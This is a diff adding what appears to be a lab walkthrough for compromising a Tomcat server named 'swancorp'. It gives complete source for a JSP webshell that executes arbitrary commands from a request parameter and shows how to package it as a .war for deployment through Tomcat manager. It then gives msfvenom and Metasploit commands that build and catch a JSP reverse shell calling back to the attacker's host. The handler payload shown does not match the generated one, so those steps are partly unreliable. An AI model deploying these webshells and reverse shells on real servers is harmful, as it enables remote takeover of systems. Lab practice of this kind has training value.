@@ -1,0 +1,74 @@
+# --------------------------------------------
+
+# Create a JSP webshell
+
+# --------------------------------------------
+
+# root@kali:~# nano -w index.jsp
+
+ 
+
+<FORM METHOD=GET ACTION='index.jsp'>
+<INPUT name='cmd' type=text>
+<INPUT type=submit value='Run'>
+</FORM>
+<%@ page import="java.io.*" %>
+<%
+String cmd = request.getParameter("cmd");
+String output = "";
+if(cmd != null) {
+String s = null;
+try {
+Process p = Runtime.getRuntime().exec(cmd,null,null);
+BufferedReader sI = new BufferedReader(new
+InputStreamReader(p.getInputStream()));
+while((s = sI.readLine()) != null) { output += s+"</br>"; }
+} catch(IOException e) { e.printStackTrace(); }
+}
+%>
+<pre><%=output %></pre>
+
+--------------------------------------------
+Create a .war file
+--------------------------------------------
+root@kali:~# mkdir webshell
+root@kali:~# mv index.jsp webshell/
+root@kali:~# cd webshell/
+root@kali:~/webshell# jar -cvf ../webshell.war *
+
+added manifest
+adding: index.jsp(in = 579) (out= 351)(deflated 39%)
+
+ 
+
+Deploy the webshell using tomcat manager, you can now run some basic commands with your new webshell, access your new webshell on the the swancorp server and try some commands. You really should get a non web shell, keep reading for more.
+
+-------------------------------------------------
+Generate a malicious file with  msfvenom
+-------------------------------------------------
+
+root@kali:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST=[YOURIPADDRESS] LPORT=[ANYPORT] -f war > runme.war
+
+Deploy this new .war file.
+
+On Kali load up msfconsole and start a multi/handler:
+
+root@kali:~# msfconsole
+
+msf > use multi/handler
+
+msf exploit(handler) > set payload linux/x64/shell_reverse_tcp
+
+msf exploit(handler) > set lhost [YOURIPADDRESS]
+
+msf exploit(handler) > set lport [THEPORTYOUCHOSE]
+
+msf exploit(handler) > exploit
+
+[*] Started reverse TCP handler on x.x.x.x:x
+[*] Starting the payload handler...
+
+Open it your war file (runme) in the browser @ http://SWANCORP.COM:8080/runme/ (Links to an external site.)
+
+
+[*] Command shell session 1 opened.....
